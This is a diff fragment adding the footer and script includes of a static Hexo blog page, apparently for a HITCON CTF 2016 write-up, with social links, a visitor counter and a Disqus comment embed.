+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  Facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      Total visitors
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      Total views
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/';
+          this.page.identifier = '2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/';
+          this.page.title = 'HITCON CTF 2016 Quals -- Shelling Folder';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
